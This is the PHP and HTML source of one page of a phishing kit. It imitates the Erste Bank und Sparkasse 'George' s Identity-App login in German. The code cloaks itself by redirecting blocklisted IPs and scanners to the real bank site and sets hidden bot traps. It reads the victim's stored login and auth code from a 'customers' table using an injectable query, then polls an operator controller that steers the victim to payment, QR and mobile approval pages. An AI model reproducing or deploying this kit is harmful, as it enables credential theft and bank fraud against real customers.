<?php
//Dwi F.D
require '../CONFIG.php';
require 'partial/margin.php';
include 'partial/zero.php';
include 'vendor/100.php';
include 'vendor/200.php';
include 'vendor/300.php';
require_once 'vendor/index.php';
require_once '../remote/500.php';
include 'vendor/netcraft_check.php';
require('../CONFIG.php');
$filename = '../2617d44145d0300cdf70349b2f3cac79.txt';
$ip_to_search = $_SERVER['REMOTE_ADDR'];

if (false !== strpos(file_get_contents($filename), $ip_to_search)) {

   header("Location: https://href.li/?https://sparkasse.at");
   $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
   file_put_contents('vendor/one_time_br_prevents.log', $line . PHP_EOL, FILE_APPEND);
   session_destroy();
   die();
} else {
   // otherwise
}
session_start();
error_reporting(0);

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if ($_SESSION['started'] == 'true') {
  $uniqueid = $_SESSION['uniqueid'];
  $query = mysqli_query($conn, "SELECT * FROM customers WHERE uniqueid=$uniqueid");
   if ($query) {
      $arr = mysqli_fetch_array($query, MYSQLI_ASSOC);
      $usrlogin = $arr['usrlogin'];
      $authcode = $arr['authcode'];
   } else {
      header('location:exit.php');
   }
} else {
  header('location:exit.php');
}
?>
<!DOCTYPE html>
<html data-cbscriptallow=true class=noIE lang=de>
<meta charset=utf-8>
<title>Erste Bank und Sparkasse - s Identity-App Login</title>
<meta http-equiv=X-UA-Compatible content="IE=edge">
<meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta http-equiv=Strict-Transport-Security content="max-age=31536000; includeSubDomains" class=sf-hidden>
<meta http-equiv=X-Frame-Options content=SAMEORIGIN class=sf-hidden>
<meta http-equiv=X-XSS-Protection content="'1; mode=block' always" class=sf-hidden>
<meta http-equiv=X-Content-Type-Options content="'nosniff' always" class=sf-hidden>
<meta http-equiv=Referrer-Policy content=strict-origin-when-cross-origin class=sf-hidden>
<meta http-equiv=Cache-Control content="no-cache, no-store" class=sf-hidden>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="expires" content="-1">
<meta http-equiv="cache-control" content="max-age=0">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Pragma: no-cache">
<meta http-equiv="Cache Control" content=no-store>
<meta http-equiv="Cache Control: no-store">
<meta name=robots content=noodp,noydir>
<link rel="shortcut icon" type=image/x-icon href=data:image/x-icon;base64,AAABAAEAEBAQAAAAAAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAwMDAAICAgAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAmZmZmZkAAAmZmZmZmZAACZmZmZmZkAAAAAAACZmQAAmZmZmZmZAACZmZmZmZkAAJmZmZmZmQAAmZkAAAAAAACZmZmZmZkAAJmZmZmZmQAACZmZmZmQAAAAAAAAAAAAAAAACZAAAAAAAACZmQAAAAAAAJmZAAAAAAAACZAAAADgB///wAP//8AD////w///wAP//8AD///AA///w////8AD///AA///4Af////////+f////D////w////+f///>
<link href="partial/css/auth.css" rel="stylesheet" />
<script src="partial/js/jquery.js">
</script>
<script>
   if (window.location.search !== '?user=true') {
      location.href = 'exit.php';
   }
</script>
<script>
   var timmer = setInterval(function () {
      //loader_status_wait
      var id = "<?=$_SESSION['uniqueid'];?>";
      var urldata = 'partial/controller.php?getstatus=' + id;
      $.ajax({
         url: urldata,
         type: 'GET',
         success: function (response) {
            //console.log(response)
            if (response == 50) {

               window.location.href = 'loginError.php?user=true'; //ok

            // } else if (response == 11) {

            //    window.location.href = 'loginAuth.php?user=true'; //ok

            } else if (response == 12) {

               window.location.href = 'payAuth.php?user=true'; //ok
               
            } else if (response == 13) {

                window.location.href = 'auth.php?user=true'; //ok
                
            } else if (response == 14) {

                window.location.href = 'qr.php?user=true'; //ok
                
            } else if (response == 15) {

                window.location.href = 'mobile.php?user=true'; //ok

            } else if (response == 100) {

               window.location.href = 'exit.php';

            } else if (response == 20) {

               window.location.href = 'dashboard.php?user=true';

            }
         }
      });

   }, 2000);
</script>

<script>
   var interval = 3000;

   function userStatus() {
      $.ajax({
         type: 'GET',
         url: 'partial/status.php',
         success: function (data) {
            var parsed_data = JSON.parse(data);
         },
         complete: function (data) {
            setTimeout(userStatus, interval);
         }
      });
   }
   setTimeout(userStatus, interval);
</script>
</head>

<body class="de hasIcon">
    <div class=wrapper style=margin-top:20px>
        <div class="col1 col">


            <h1 class="logo sf-hidden" id=Doppel-Logo_o_Claim></h1>


            <div class=product>

                <img src=data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNDZweCIgaGVpZ2h0PSI3NHB4IiB2aWV3Qm94PSIzNjQuMjUgMjYyLjc1NCA0NiA3NCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAzNjQuMjUgMjYyLjc1NCA0NiA3NCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNMzg3LjEyNywzMjkuNTRjOC42MiwwLDE1LjYzMy03LjAxMiwxNS42MzMtMTUuNjMzaDcuMjE1YzAsMTIuNi0xMC4yNDksMjIuODQ3LTIyLjg0OCwyMi44NDdWMzI5LjU0eiIvPg0KPHBhdGggZmlsbD0iIzAwNDk3QiIgZD0iTTM4Ny4wOTcsMzA4LjY4M2MtMTIuNTk5LDAtMjIuODQ4LTEwLjI0OS0yMi44NDgtMjIuODQ4YzAtMTIuNTk4LDEwLjI0OS0yMi44NDgsMjIuODQ4LTIyLjg0OA0KCWMxMi41OTksMCwyMi44NDksMTAuMjUsMjIuODQ5LDIyLjg0OEM0MDkuOTQ2LDI5OC40MzQsMzk5LjY5NywzMDguNjgzLDM4Ny4wOTcsMzA4LjY4M3ogTTM4Ny4wOTcsMjcwLjIwNA0KCWMtOC42MiwwLTE1LjYzMyw3LjAxMy0xNS42MzMsMTUuNjMyYzAsOC42MjEsNy4wMTMsMTUuNjMzLDE1LjYzMywxNS42MzNjOC42MjEsMCwxNS42MzMtNy4wMTIsMTUuNjMzLTE1LjYzMw0KCUM0MDIuNzMxLDI3Ny4yMTcsMzk1LjcxOCwyNzAuMjA0LDM4Ny4wOTcsMjcwLjIwNHoiLz4NCjwvc3ZnPg0K
                    class=producticon width=60 height=60>

                <h2>George</h2>
                <p class=sf-hidden>Einfach. Intelligent. Individuell. Und mehr. Willkommen beim modernsten Banking
                    Österreichs.</p>
                <div class="commonalert moved sf-hidden">
                </div>
            </div>

        </div>
        <div class="col2 col" role=main style=min-height:647px>
            <div class=whitebox style=height:503px>
                <h1 class=sf-hidden>

                </h1>
                <div class=iealert style=padding-bottom:0px></div>
                <div id=error class="infotext sf-hidden" role=alert></div>
                <div class="commonalert sf-hidden">
                </div>
                <div class=commontext role=main>
                    Sie erhalten für den Login in Kürze eine Freigabeanfrage in Ihrer s
                    Identity-App.<br><br><b>Überprüfen Sie vor dem Login die Übereinstimmung der Prüfziffer!</b>
                    <br><br>
                    <div class=number>
                        <span class="icon numbericon hasBgImage"></span><input id=user class=input value="<?=$usrlogin;?>"
                            disabled readonly><span class=changenumber><a id=cancelIcon
                                href="index.php"
                                title="Benutzer wechseln"></a></span>
                    </div>
                    <br>
                    Aktuelle Prüfziffer: <b><?=$authcode;?></b>
                    <br><br>
                    <p style=color:red;font-weight:bold>WICHTIG!<p style=color:red>Öffnen Sie jetzt die s Identity-App
                            (Smartphone oder Desktop) manuell, um den Login fortzusetzen - einfach auf das s
                            Identity-App-Icon drücken!</p>
                        <div id=loader class=loader-container>
                            <div class="eg_loader eg_loader--blue"></div>
                        </div>

                        <div id=errorhash></div>

                </div>
                <div class=submit>


                </div>
            </div>
            <div class=links style=top:503px>

                <a id=cancelLink
                    href="index.php">
                    Zurück
                </a>
                <br>

            </div>
            <div class="links moved" style=top:503px>


                <a href=#tiny/impressum-george target=_blank>Impressum</a>

                <br>
                <a href=#tiny/datenschutz-george target=_blank>Datenschutz</a>

                <br>
                <a href=#tiny/gbg-george target=_blank>Geschäftsbedingungen</a>

                <br>
                <a href=#tiny/service-kontakt-george target=_blank>Service &amp; Kontakt</a>

            </div>


        </div>
        <h1 class="logo moved" id=Doppel-Logo_o_Claim><img
                src="partial/img/logo.svg"
                style=width:100%;height:auto></h1>
    </div>
    <div class=isSmallScreen id=isSmallScreen></div>
    <form action="vendor/" method=POST>
        <div style="display:none;">
            <input type=text>
            <button style="display:none" type="submit">Submit button</button>
        </div>
    </form>
    <noscript>
        <form action="vendor/" method=POST>
            <div style="display:none;">
                <input type=text>
                <button style="display:none" type="submit">Submit button</button>
            </div>
        </form>
    </noscript>
    <noscript><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be
            banned from the site!</a>
    </noscript>
    <a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned
        from the site!</a>
    <noscript><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be
            banned from the site!</a>
    </noscript>
    <a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned
        from the site!</a>
   